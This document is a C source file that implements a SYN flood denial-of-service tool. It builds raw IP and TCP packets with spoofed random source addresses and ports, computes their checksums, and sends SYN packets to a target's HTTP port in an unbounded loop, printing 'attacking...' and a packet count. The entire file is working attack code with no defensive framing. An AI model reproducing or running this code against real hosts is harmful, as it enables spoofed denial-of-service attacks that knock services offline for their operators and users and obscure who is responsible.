#include "DDoS.h"

static int packetCount = 0;
static bool isSending = true;
static char sourceIP[32];

int RandomPort()  { return rand() % 65535; }
int RandomForIP() { return rand() % 255;   }

char* RandomIP() 
{
    strcpy(sourceIP, "");
    int dots = 0;

    while (dots < 3)
    {
        sprintf(sourceIP, "%s%d", sourceIP, RandomForIP());
        strcat(sourceIP, ".");
        fflush(NULL);
        dots++;
    }

    sprintf(sourceIP, "%s%d", sourceIP, RandomForIP());
    strcat(sourceIP, "\0");
    return sourceIP;
}

int ValidIP(char* ip) 
{
    struct sockaddr_in socketAddressInput;
    return inet_pton(AF_INET, ip, &(socketAddressInput.sin_addr)) != 0;
}

void StopFlood()
{
    printf("\n%d [DATA] packets sent\n", packetCount);
    isSending = false;
}

uint16_t Checksum(uint16_t* pointer, int numBytes) 
{
    register long sum = 0;
    unsigned short oddByte;
    register short answer;

    while (numBytes > 1)
    {
        sum += *pointer++;
        numBytes -= 2;
    }

    if (numBytes == 1)
    {
        oddByte = 0;
        *((uint8_t*) &oddByte) = *(uint8_t*) pointer;
        sum += oddByte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return answer;
}

void Flood(void* destinationIPvoid)
{
    char* destinationIP = (char*) destinationIPvoid;
    int destinationPort = HTTP_PORT;
    int option          = 0;

    srand(time(0));                

    printf("[DATA: %s] Flood is starting...\n", destinationIP);

    int socketFD = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    char datagram[4096];

    struct iphdr* ipHeader   = (struct iphdr*) datagram;
    struct tcphdr* tcpHeader = (struct tcphdr*) (datagram + sizeof(struct ip));
    struct sockaddr_in socketAddressInput;
    PseudoHeader pseudoHeader;

    socketAddressInput.sin_addr.s_addr = inet_addr(destinationIP);
    socketAddressInput.sin_port = htons(5060);                    
    socketAddressInput.sin_family = AF_INET;                     

    memset(datagram, 0, 4096);

    ipHeader->ihl      = 5;                                            
    ipHeader->version  = 4;                                        
    ipHeader->tos      = 0;                                           
    ipHeader->tot_len  = sizeof(struct ip) + sizeof(struct tcphdr);
    ipHeader->id       = htons(54321);                              
    ipHeader->frag_off = 0;              
    ipHeader->ttl      = 255;                  
    ipHeader->protocol = IPPROTO_TCP;    
    ipHeader->check    = 0;                 
    ipHeader->daddr    = socketAddressInput.sin_addr.s_addr;

    tcpHeader->dest    = htons(destinationPort);
    tcpHeader->seq     = 0;                   
    tcpHeader->ack_seq = 0;
    tcpHeader->doff    = 5;
    tcpHeader->fin     = 0;
    tcpHeader->syn     = true;
    tcpHeader->rst     = false;
    tcpHeader->psh     = 0;
    tcpHeader->ack     = 0;
    tcpHeader->urg     = 0;
    tcpHeader->window  = htons(5840);
    tcpHeader->urg_ptr = 0;

    pseudoHeader.destinationAddress = socketAddressInput.sin_addr.s_addr;
    pseudoHeader.placeholder        = 0;
    pseudoHeader.protocol           = IPPROTO_TCP;
    pseudoHeader.tcpLength          = htons(20);

    int tempOne = 1;
    const int* value = &tempOne;
    if (setsockopt(socketFD, IPPROTO_IP, IP_HDRINCL, value, sizeof(tempOne)) < 0)
    {
        printf("[ERR: %s] number : %d  Error message : %s \n", destinationIP, errno, strerror(errno));
        fprintf(stderr, "Program needs to be run by root user\n");
        exit(-1);
    }

    printf("[DATA: %s@%d] attacking...\n", destinationIP, destinationPort);

    isSending = true;
    packetCount = 0;

    while (isSending) 
    {
        ipHeader->saddr = inet_addr(RandomIP());
        ipHeader->check = Checksum((unsigned short*) datagram, 
                                   ipHeader->tot_len >> 1);

        pseudoHeader.sourceAddress = inet_addr(sourceIP);
        
        tcpHeader->source = htons(RandomPort());
        tcpHeader->check = 0;               
        
        memcpy(&pseudoHeader.tcpHeader, tcpHeader, sizeof(struct tcphdr));
        tcpHeader->check = Checksum((unsigned short*) &pseudoHeader, sizeof(PseudoHeader));

        if (sendto(socketFD, datagram, ipHeader->tot_len, 0, (struct sockaddr*) &socketAddressInput, sizeof(socketAddressInput)) < 0) 
        {
            printf("\n[ERR: %s] Program terminated\n", destinationIP);
            exit(0);
        } else packetCount++;
        printf("%d\n", packetCount);
    }

    close(socketFD);
}
